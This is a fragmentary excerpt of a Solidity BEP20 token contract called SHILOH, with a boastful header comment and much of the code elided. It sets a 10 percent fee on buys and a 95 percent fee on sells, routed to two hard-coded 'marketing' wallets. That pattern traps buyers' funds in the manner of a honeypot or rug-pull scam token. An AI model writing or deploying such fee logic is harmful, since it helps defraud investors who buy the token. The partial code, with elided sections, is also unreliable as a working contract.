...
/**
 SHILO WILL DESTROY ALL INUS IN ITS WAY. PREPARE TO BOW TO THE NEW ALPHA
*/
...
contract SHILOH is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "SHILOH";
    string constant _symbol = "SHO";
    ...
    uint256 public extraFeeOnSell = 85;

    uint256 public totalFee = 10;
    uint256 public totalFeeIfSelling = 95;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingWallet = 0x1b2A857D9e681B8EcB67732AFA6b85854764DDb4;  
        anothermarketingWallet = 0xA6Ef5C27bdFF581DDae7ED564292bF5f5eeeb8bf;
    ...
    function swapBack() internal lockTheSwap {
        ...
        uint256 marketingShare = amountBNBMarketing.mul(3).div(3);
